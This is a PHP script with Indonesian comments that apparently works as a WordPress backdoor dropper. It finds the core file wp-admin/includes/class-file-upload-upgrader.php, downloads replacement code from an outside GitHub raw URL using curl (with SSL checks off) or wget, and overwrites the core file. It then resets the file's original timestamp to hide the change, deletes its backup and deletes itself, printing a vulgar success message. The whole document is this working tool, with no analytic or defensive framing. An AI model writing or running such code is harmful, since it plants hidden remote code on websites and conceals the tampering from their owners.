<?php
$target_file_name = 'wp-admin/includes/class-file-upload-upgrader.php';
$source_url = 'https://raw.githubusercontent.com/lifecarediagnosticcom-wq/mieayampakmat/refs/heads/main/aa.php';

function find_target_file($start_dir, $target_file_name, $depth = 10) {
    $dir = realpath($start_dir);
    for ($i = 0; $i < $depth; $i++) {
        $try = $dir . DIRECTORY_SEPARATOR . $target_file_name;
        if (file_exists($try)) return $try;
        $dir = dirname($dir);
    }
    return false;
}

function curl_get_contents($url) {
    if (!function_exists('curl_init')) return false;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0',
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function wget_get_contents($url) {
    $tmp_file = tempnam(sys_get_temp_dir(), 'wget_');
    $cmd = "wget -q -O " . escapeshellarg($tmp_file) . " " . escapeshellarg($url) . " 2>/dev/null";
    exec($cmd);
    $content = @file_get_contents($tmp_file);
    unlink($tmp_file);
    return $content;
}

// Temukan file target
$target_file = find_target_file(__DIR__, $target_file_name);
if (!$target_file) {
    die("File target tidak ditemukan!\n");
}

// Simpan timestamp asli
$original_timestamp = filemtime($target_file);

// Coba unduh konten
$new_content = curl_get_contents($source_url);
if ($new_content === false || empty($new_content)) {
    $new_content = wget_get_contents($source_url);
}
if ($new_content === false || empty($new_content)) {
    die("Gagal mengunduh konten baru (curl & wget gagal)!\n");
}

// Backup file asli
$backup_name = $target_file . '.bak';
if (!copy($target_file, $backup_name)) {
    die("Gagal membuat backup file!\n");
}

// Tulis konten baru
if (file_put_contents($target_file, $new_content) === false) {
    copy($backup_name, $target_file);
    die("Gagal menulis konten baru!\n");
}

// Update timestamp
if (!touch($target_file, $original_timestamp)) {
    copy($backup_name, $target_file);
    die("Gagal mengupdate timestamp!\n");
}

// Hapus backup
unlink($backup_name);

echo "GACOR NGENTOD: $target_file\n";

// Hapus file skrip ini setelah selesai
unlink(__FILE__);

?>
